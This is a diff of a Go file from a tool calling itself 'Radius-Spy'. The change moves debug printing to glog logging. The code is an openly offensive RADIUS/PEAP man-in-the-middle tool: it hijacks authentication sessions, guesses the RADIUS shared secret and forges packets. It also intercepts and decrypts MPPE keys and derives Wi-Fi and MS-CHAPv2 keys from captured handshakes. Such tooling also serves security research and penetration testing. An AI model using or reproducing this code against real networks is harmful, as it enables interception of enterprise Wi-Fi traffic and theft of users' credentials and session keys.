@@ -5,12 +5,13 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"flag"
-	"fmt"
 	"net"
 	"radius/eap"
 	"radius/radius"
 	"radius/session"
 	"radius/tlsadditions"
+
+	"github.com/golang/glog"
 )
 
 //delayedTLSData struct to hold the TLS data that has been captured but cannot be forwarded because
@@ -23,6 +24,8 @@ type delayedTLSData struct {
 }
 
 var delayedTLSChunks []delayedTLSData
+
+const softVersion = "1.0.0"
 
 const authPort = 1812
 const accPort = 1813
@@ -45,10 +48,8 @@ func forwardOrDelayTLSData(tlsContent []byte, context *session.ContextInfo, peap
 	}
 
 	if (clientToServer && tlsSession.GetServerHandShakeStatus() > 2) || (!clientToServer && tlsSession.GetNASHandShakeStatus() > 2) {
-		fmt.Println("TLS Data forwarded", clientToServer)
 		onTLSData(tlsContent, context, peapPacket, clientToServer)
 	} else {
-		fmt.Println("TLS Data delayed", clientToServer)
 		delayedTLSChunks = append(delayedTLSChunks, tlsChunk)
 	}
 
@@ -61,7 +62,6 @@ func deliverDelayedTLSData(clientToServer bool) {
 	for i < len(delayedTLSChunks) {
 
 		if delayedTLSChunks[i].clientToServer == clientToServer {
-			fmt.Println("TLS Data delivered", clientToServer)
 			onTLSData(delayedTLSChunks[i].tlsContent, delayedTLSChunks[i].context,
 				delayedTLSChunks[i].peapPacket,
 				delayedTLSChunks[i].clientToServer)
@@ -94,16 +94,12 @@ func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UD
 		return true //At the moment, we do not do anything for Accounting messages
 	}
 
-	fmt.Println()
-	fmt.Println()
-	fmt.Println()
-
-	fmt.Println("¡¡¡PACKAGE RECEIVED!!!")
+	glog.V(1).Infoln("***PACKAGE RECEIVED***")
 
 	//Print some useful information about the packet
-	fmt.Println("Pck rcv from ", from, "to", to)
-	fmt.Println("Code:", manglePacket.GetCode())
-	fmt.Println("Id:", manglePacket.GetId())
+	glog.V(1).Infoln("From ", from, "to", to)
+	glog.V(1).Infoln("Code:", manglePacket.GetCode())
+	glog.V(1).Infoln("Id:", manglePacket.GetId())
 
 	//Get the session context by means of the client address
 	context := session.GetContextByClient(client)
@@ -147,17 +143,15 @@ func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UD
 
 	if ok, eapMsg := manglePacket.GetEAPMessage(); ok {
 
-		//fmt.Println("eapMsg:", eapMsg)
-
 		var eapHeader eap.HeaderEap
 
 		ok = eapHeader.Decode(eapMsg)
 
 		if ok {
-			fmt.Println("EAP Decode Code:", eapHeader.GetCode())
-			fmt.Println("EAP Decode ID:", eapHeader.GetId())
-			fmt.Println("EAP Decode Type:", eapHeader.GetType())
-			fmt.Println("EAP Decode Length:", eapHeader.GetLength())
+			glog.V(1).Infoln("EAP Decode Code:", eapHeader.GetCode())
+			glog.V(1).Infoln("EAP Decode ID:", eapHeader.GetId())
+			glog.V(1).Infoln("EAP Decode Type:", eapHeader.GetType())
+			glog.V(1).Infoln("EAP Decode Length:", eapHeader.GetLength())
 
 			//Success message. We need to modify some fields...
 			if eapHeader.GetCode() == eap.EAPSuccess {
@@ -173,7 +167,6 @@ func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UD
 				ok = eapPacket.Decode(eapMsg)
 
 				if ok {
-					fmt.Println("EAP decoded")
 
 					//Keep track of the last EAP message ID
 					if clientToServer {
@@ -189,12 +182,12 @@ func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UD
 							context.SetEAPIdentity(identPacket.GetIdentity()) //Set EAP identity
 						} else {
 
-							fmt.Println("Eap identity not expected in this message")
+							glog.V(1).Infoln("Eap identity not expected in this message")
 						}
 					case eap.LegacyNak:
 						legacyNak := eapPacket.(*eap.EapNak)
 
-						fmt.Println("Desired Eap method type to authenticate:", legacyNak.GetDesiredType())
+						glog.V(1).Infoln("Desired Eap method type to authenticate:", legacyNak.GetDesiredType())
 
 						context.SetEapMethod(uint8(legacyNak.GetDesiredType())) //Set desired EAP method
 
@@ -226,8 +219,6 @@ func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UD
 	//Check the status concerning the secret for the current context
 	switch status {
 	case session.SecretUnknown:
-		fmt.Println("No secret")
-		fmt.Println("Determine secret")
 		mySession.GuessSecret(manglePacket.Clone(), client, server, clientToServer)
 
 	case session.SecretOk:
@@ -243,7 +234,7 @@ func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UD
 func manageServerPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, peapPacket *eap.EapPeap, context *session.ContextInfo, clientToServer bool) bool {
 
 	if peapPacket.GetStartFlag() { //A TLS session is about to start
-		fmt.Println("PEAP session about to start.")
+		glog.V(2).Infoln("PEAP session about to start.")
 
 		//Create a TLS session
 
@@ -253,8 +244,6 @@ func manageServerPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to ne
 
 		rawTLSToServer := tlsSession.GetServerTunnel().ReadRaw()
 		//rawTLSToServer := tlsSession.ServerReadRaw()
-
-		fmt.Println("rawTLSToServer:", rawTLSToServer)
 
 		//At this point, we start to manage the session. Send EAP response to server
 		craftedPacket := craftPacketFromTLSPayload(context, rawTLSToServer, manglePacket.GetId()+1, peapPacket.GetId(), !clientToServer, [16]byte{})
@@ -284,7 +273,7 @@ func manageServerPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to ne
 		//Check whether we have the whole TLS packet or not.
 		if peapPacket.GetMoreFlag() {
 
-			fmt.Println("¡¡¡¡¡More frags detected from server!!!!!")
+			glog.V(2).Infoln("¡¡¡¡¡More frags detected from server!!!!!")
 
 			//Send ACK Eap Message to the Server
 			craftedPacket := craftPacketFromTLSPayload(context, nil, manglePacket.GetId()+1,
@@ -298,7 +287,7 @@ func manageServerPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to ne
 			payload, length := context.GetAndDeleteServerTLSPayloadAndLength()
 
 			if length != 0 && uint32(len(payload)) != length {
-				fmt.Println("EAPMessage --> Length mismatch!! len(payload) -->", len(payload), "length -->", length)
+				glog.V(1).Infoln("EAPMessage --> Length mismatch!! len(payload) -->", len(payload), "length -->", length)
 
 			}
 
@@ -330,7 +319,7 @@ func manageServerPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to ne
 				tlsSession.SetServerHandShakeStatus(3)
 
 				deliverDelayedTLSData(!clientToServer)
-				fmt.Println("Handshake with server OK")
+				glog.V(2).Infoln("Handshake with server OK")
 
 			} else {
 				//TLS Payload to handle
@@ -364,23 +353,23 @@ func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.U
 			tlsSession.SetNASHandShakeStatus(3) //Ack from the client to tell us the TLS session succeded
 			deliverDelayedTLSData(!clientToServer)
 
-			fmt.Println("Handshake with NAS OK")
+			glog.V(2).Infoln("Handshake with NAS OK")
 
 			//Calculate Wifi Keys from TLS session
 			randomClient := tlsSession.GetRandomClient()
 			randomServer := tlsSession.GetRandomServer()
 			masterSecret := tlsSession.GetMasterSecret()
 
-			fmt.Println("Random Client:")
-			fmt.Println(hex.Dump(randomClient[:]))
+			glog.V(3).Infoln("Random Client:")
+			glog.V(3).Infoln(hex.Dump(randomClient[:]))
 
-			fmt.Println("Random Server:")
-			fmt.Println(hex.Dump(randomServer[:]))
+			glog.V(3).Infoln("Random Server:")
+			glog.V(3).Infoln(hex.Dump(randomServer[:]))
 
-			fmt.Println("Master Secret:")
-			fmt.Println(hex.Dump(masterSecret[:]))
+			glog.V(3).Infoln("Master Secret:")
+			glog.V(3).Infoln(hex.Dump(masterSecret[:]))
 
-			fmt.Println("Calculating Keys:")
+			glog.V(3).Infoln("Calculating Keys:")
 
 			tlsVersion := tlsSession.GetNASVersion()
 
@@ -391,10 +380,10 @@ func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.U
 			keyringMaterial, err := getKeyringFunc(label, nil, 64)
 
 			if err != nil {
-				fmt.Println("Error exporting keyring material:")
+				glog.V(1).Infoln("Error exporting keyring material:", err)
 			} else {
-				fmt.Println("Keyring material:")
-				fmt.Println(hex.Dump(keyringMaterial))
+				glog.V(3).Infoln("Keyring material:")
+				glog.V(3).Infoln(hex.Dump(keyringMaterial))
 
 				//Derived Key obtained
 				context.SetDerivedKey(keyringMaterial)
@@ -432,7 +421,7 @@ func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.U
 			payload, length := context.GetAndDeleteNASTLSPayloadAndLength()
 
 			if length != 0 && uint32(len(payload)) != length {
-				fmt.Println("EAPMessage --> Length mismatch!! len(payload) -->", len(payload), "length -->", length)
+				glog.V(1).Infoln("EAPMessage --> Length mismatch!! len(payload) -->", len(payload), "length -->", length)
 			}
 
 			tlsSession.GetNASTunnel().WriteRaw(payload)
@@ -449,18 +438,18 @@ func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.U
 					if ok, tlsVersion := tlsadditions.GetVersionFromTLSData(payload); ok {
 
 						if tlsVersion == 0x301 {
-							fmt.Println("TLS version 1.0")
+							glog.V(2).Infoln("TLS version 1.0")
 						} else {
-							fmt.Println("TLS version NOT 1.0")
+							glog.V(2).Infoln("TLS version NOT 1.0")
 						}
 						tlsSession.SetNASVersion(tlsVersion)
 					}
 
-					fmt.Println("Decoding Random Client.")
+					glog.V(2).Infoln("TLS Decoding Random Client.")
 					//Get Client Random from Client Hello message in TLS handshake message
 					if ok, clientRandom := tlsadditions.GetRandomFromTLSData(payload, true); ok {
-						fmt.Println("Random Client:")
-						fmt.Println(hex.Dump(clientRandom))
+						glog.V(3).Infoln("TLS Random Client:")
+						glog.V(3).Infoln(hex.Dump(clientRandom))
 
 						tlsSession.SetRandomClient(clientRandom)
 					}
@@ -472,11 +461,11 @@ func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.U
 
 				if tlsSession.GetNASHandShakeStatus() == 0 { //First handshake message that we generate
 
-					fmt.Println("Decoding Random Server.")
+					glog.V(2).Infoln("TLS Decoding Random Server.")
 					//Get Server Random from Server Hello message in TLS handshake message
 					if ok, serverRandom := tlsadditions.GetRandomFromTLSData(rawResponse, false); ok {
-						fmt.Println("Random Server:")
-						fmt.Println(hex.Dump(serverRandom))
+						glog.V(3).Infoln("TLS Random Server:")
+						glog.V(3).Infoln(hex.Dump(serverRandom))
 
 						tlsSession.SetRandomServer(serverRandom)
 
@@ -516,10 +505,6 @@ func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.U
 
 func craftPacketFromTLSPayload(context *session.ContextInfo, payload []byte, msgID uint8, eapID uint8, clientToServer bool, authenticator [16]byte) *radius.RadiusPacket {
 
-	//fmt.Println("Authenticator", hex.Dump(authenticator[:]))
-
-	//fmt.Println("craftPacketFromTLSPayload Send packet")
-
 	craftedPacket := radius.NewRadiusPacket()
 	craftedPacket.SetId(msgID)
 
@@ -552,7 +537,7 @@ func craftPacketFromTLSPayload(context *session.ContextInfo, payload []byte, msg
 		_, err := rand.Read(authenticator[:])
 
 		if err != nil {
-			fmt.Println("Error in random function", err)
+			glog.V(1).Infoln("Error in random function", err)
 			return nil
 		}
 
@@ -596,8 +581,8 @@ func onTLSData(tlsContent []byte, context *session.ContextInfo,
 
 	var eapHeader eap.HeaderEap
 
-	fmt.Println("onTLSData. Data:")
-	fmt.Println(hex.Dump(tlsContent))
+	glog.V(3).Infoln("onTLSData. Data:")
+	glog.V(3).Infoln(hex.Dump(tlsContent))
 
 	//Forward TLS data
 	tlsSession := context.GetTLSSession()
@@ -620,7 +605,7 @@ func onTLSData(tlsContent []byte, context *session.ContextInfo,
 		authenticator = context.GetLastAuthMsg()
 	}
 
-	fmt.Println("Forwarding TLS. MSG ID: ", lastMsgID, ", EAP ID:", lastEapID)
+	glog.V(2).Infoln("Forwarding TLS. MSG ID: ", lastMsgID, ", EAP ID:", lastEapID)
 
 	craftedPacket := craftPacketFromTLSPayload(context, rawContent, lastMsgID, lastEapID, clientToServer, authenticator)
 
@@ -678,39 +663,38 @@ func onTLSData(tlsContent []byte, context *session.ContextInfo,
 		tlsContent = append(header, tlsContent...)
 	}
 
-	fmt.Println("onTLSData. Treated data:")
-	fmt.Println(hex.Dump(tlsContent))
+	glog.V(3).Infoln("onTLSData. Converted data:")
+	glog.V(3).Infoln(hex.Dump(tlsContent))
 
 	//Once we added the missing data, we can proceed to decode the tunneled EAP message.
 
-	fmt.Println("Decoding inner EAP message")
+	glog.V(1).Infoln("Decoding inner EAP message")
 
 	if ok := eapHeader.Decode(tlsContent); ok {
-		fmt.Println("Inner EAP header decoded-->")
-		fmt.Println("Code:", eapHeader.GetCode(), ", ID:", eapHeader.GetId())
+		glog.V(1).Infoln("Inner EAP header decoded-->")
+		glog.V(1).Infoln("Code:", eapHeader.GetCode(), ", ID:", eapHeader.GetId())
 
 		if eapHeader.GetCode() == eap.EAPRequest || eapHeader.GetCode() == eap.EAPResponse {
-			fmt.Println("Method:", eapHeader.GetType())
+			glog.V(1).Infoln("Method:", eapHeader.GetType())
 
 			eapPacket := eap.GetEAPByType(eapHeader.GetType())
 
 			if ok := eapPacket.Decode(tlsContent); ok {
-				fmt.Println("Inner EAP Decoded")
 
 				switch eapPacket.GetType() {
 				case eap.MsChapv2:
-					fmt.Println("Method MSChapv2")
+					glog.V(1).Infoln("Method MSChapv2")
 
 					msChapv2Packet := eapPacket.(*eap.EapMSCHAPv2)
 
 					manageMsChapV2(msChapv2Packet, context)
 
 				case eap.TLV:
-					fmt.Println("Method TLV result")
+					glog.V(1).Infoln("Method TLV result")
 
 					tlvEap := eapPacket.(*eap.EapTLVResult)
 
-					fmt.Println("Result:", tlvEap.GetResult())
+					glog.V(1).Infoln("Result:", tlvEap.GetResult())
 
 				}
 			}
@@ -723,66 +707,65 @@ func onTLSData(tlsContent []byte, context *session.ContextInfo,
 
 func manageMsChapV2(packet *eap.EapMSCHAPv2, context *session.ContextInfo) {
 
-	fmt.Println("MSChapv2 MsID:", packet.GetMsgID())
+	glog.V(2).Infoln("MSChapv2 MsID:", packet.GetMsgID())
 
 	if packet.GetName() != "" {
-		fmt.Println("MSChapv2 Name:", packet.GetName())
+		glog.V(2).Infoln("MSChapv2 Name:", packet.GetName())
 	}
 
 	switch packet.GetOpCode() {
 	case eap.MsChapV2Challenge: //Server sends a challenge request
-		fmt.Println("Received auth challenge:")
-		fmt.Println(hex.Dump(packet.GetAuthChallenge()))
+		glog.V(2).Infoln("Received auth challenge")
+		glog.V(3).Infoln(hex.Dump(packet.GetAuthChallenge()))
 
 		context.SetMsChapV2AuthChallenge(packet.GetAuthChallenge())
 
 	case eap.MsChapV2Response: //Peer sends a challenge response
-		fmt.Println("Received response")
+		glog.V(2).Infoln("Received response")
 		peerChallenge, ntResponse, _ := eap.MSCHAPv2ExtractFromResponse(packet.GetResponse())
 
-		fmt.Println("Peer challenge")
-		fmt.Println(hex.Dump(peerChallenge))
+		glog.V(3).Infoln("Peer challenge")
+		glog.V(3).Infoln(hex.Dump(peerChallenge))
 
 		context.SetMsChapV2PeerChallenge(peerChallenge)
 
-		fmt.Println("NT-Response")
-		fmt.Println(hex.Dump(ntResponse))
+		glog.V(3).Infoln("NT-Response")
+		glog.V(3).Infoln(hex.Dump(ntResponse))
 
 		context.SetMsChapV2NTResponse(ntResponse)
 
-		fmt.Println("Generating local NT-Response from intercepted data")
+		glog.V(2).Infoln("Generating local NT-Response from intercepted data")
 
 		calculatedResponse := eap.MsChapV2GenerateNTResponse(context.GetMsChapV2AuthChallenge(), context.GetMsChapV2PeerChallenge(), context.GetUserName(), "password")
 
-		fmt.Println("Local NT-Response:")
+		glog.V(3).Infoln("Local NT-Response")
+		glog.V(3).Infoln(hex.Dump(calculatedResponse))
 
-		fmt.Println(hex.Dump(calculatedResponse))
-
-		fmt.Println("Calculating Master key")
+		glog.V(2).Infoln("Calculating Master key")
 
 		masterKey := eap.MsChapV2GetMasterKeyFromPsswd("password", ntResponse)
 
-		fmt.Println("Calculated Master Key:")
-		fmt.Println(hex.Dump(masterKey))
+		glog.V(3).Infoln("Calculated Master Key:")
+		glog.V(3).Infoln(hex.Dump(masterKey))
 
-		fmt.Println("Calculating Send key")
+		glog.V(2).Infoln("Calculating Send key")
 
 		sendKey := eap.MsChapV2GetSendKey(masterKey)
-		fmt.Println("Calculated Send Key:")
-		fmt.Println(hex.Dump(sendKey))
+		glog.V(3).Infoln("Calculated Send Key:")
+		glog.V(3).Infoln(hex.Dump(sendKey))
 
-		fmt.Println("Calculating Receive key")
+		glog.V(2).Infoln("Calculating Receive key")
 
 		receiveKey := eap.MsChapV2GetReceiveKey(masterKey)
-		fmt.Println("Calculated Receive Key:")
-		fmt.Println(hex.Dump(receiveKey))
+		glog.V(3).Infoln("Calculated Receive Key:")
+		glog.V(3).Infoln(hex.Dump(receiveKey))
 
 	case eap.MsChapV2Success:
 
 		if packet.GetCode() == eap.EAPRequest { //Server sends a success request
 
-			fmt.Println("Received Success request")
-			fmt.Println("Message from server:", packet.GetMessage())
+			glog.V(2).Infoln("Received Success request")
+			glog.V(2).Infoln("Message from server:", packet.GetMessage())
 
 			context.SetServerMessage(packet.GetMessage())
 
@@ -791,7 +774,7 @@ func manageMsChapV2(packet *eap.EapMSCHAPv2, context *session.ContextInfo) {
 			calcMessage := eap.MsChapV2GenerateAuthenticatorResponse("password", context.GetMsChapV2NTResponse(),
 				context.GetMsChapV2PeerChallenge(), context.GetMsChapV2AuthChallenge(), context.GetUserName())
 
-			fmt.Println("Calculated message:", calcMessage)
+			glog.V(2).Infoln("Calculated message:", calcMessage)
 
 		}
 
@@ -824,13 +807,13 @@ func processEapSuccessResponse(context *session.ContextInfo, eapHeader *eap.Head
 
 			//Obtain the MPPE receive key
 			if ok, rcvKey := manglePacket.GetMSMPPERecvKey(); ok {
-				fmt.Println("Recv key")
-				fmt.Println(hex.Dump(rcvKey))
+				glog.V(1).Infoln("MPPE Recv key intercepted")
+				glog.V(3).Infoln(hex.Dump(rcvKey))
 
 				//Decrypt key
-				fmt.Println("Decrypt recv key:")
+				glog.V(2).Infoln("Decrypt recv key")
 				if ok, decryptedRcvKey := radius.DecryptKeyFromMPPE(rcvKey, context.GetLastGenAuthMsg(), context.GetSecret()); ok {
-					fmt.Println(hex.Dump(decryptedRcvKey))
+					glog.V(3).Infoln(hex.Dump(decryptedRcvKey))
 
 					//This key is based in TLS session between us and Radius Server which differs
 					//from the TLS session created between the wireless peer and us.
@@ -847,7 +830,7 @@ func processEapSuccessResponse(context *session.ContextInfo, eapHeader *eap.Head
 					}
 
 				} else {
-					fmt.Println("Failed")
+					glog.V(2).Infoln("Failed")
 
 				}
 
@@ -855,13 +838,13 @@ func processEapSuccessResponse(context *session.ContextInfo, eapHeader *eap.Head
 
 			//Obtain the MPPE send key
 			if ok, sndKey := manglePacket.GetMSMPPESendKey(); ok {
-				fmt.Println("Send key")
-				fmt.Println(hex.Dump(sndKey))
+				glog.V(1).Infoln("MPPE Send key intercepted")
+				glog.V(3).Infoln(hex.Dump(sndKey))
 
 				//Decrypt key
-				fmt.Println("Decrypt send key:")
+				glog.V(2).Infoln("Decrypt send key:")
 				if ok, decryptedSndKey := radius.DecryptKeyFromMPPE(sndKey, context.GetLastGenAuthMsg(), context.GetSecret()); ok {
-					fmt.Println(hex.Dump(decryptedSndKey))
+					glog.V(3).Infoln(hex.Dump(decryptedSndKey))
 
 					//This key is based in TLS session between us and Radius Server which differs
 					//from the TLS session created between the wireless peer and us.
@@ -878,8 +861,7 @@ func processEapSuccessResponse(context *session.ContextInfo, eapHeader *eap.Head
 					}
 
 				} else {
-					fmt.Println("Failed")
-
+					glog.V(2).Infoln("Failed")
 				}
 			}
 
@@ -914,7 +896,7 @@ func updateContextFromPacket(context *session.ContextInfo, manglePacket *radius.
 		context.SetNasPortType(nasPortType)
 
 		if nasPortType == wireless80211Port {
-			fmt.Println("WIFI network Authetication!!")
+			glog.V(1).Infoln("WIFI network Authetication!!")
 
 			//Set the current user name if not done before
 			if ok, user := manglePacket.GetUserName(); ok {
@@ -972,15 +954,24 @@ func main() {
 
 	session.SetConfig(*secrets)
 
+	glog.V(0).Infoln("Radius-Spy. Version", softVersion)
+
 	//Init session
 
 	mode := session.Passive
 
 	if *active {
 		mode = session.Active
+		glog.V(1).Infoln("Mode active")
+	} else {
+		glog.V(1).Infoln("Mode passive")
 	}
 
+	glog.V(0).Infoln("Initializing...")
+
 	mySession.Init(mode, hostName, authPort, accPort)
+
+	glog.V(0).Infoln("Hijacking session...")
 
 	mySession.Hijack(manglePacket)
 }
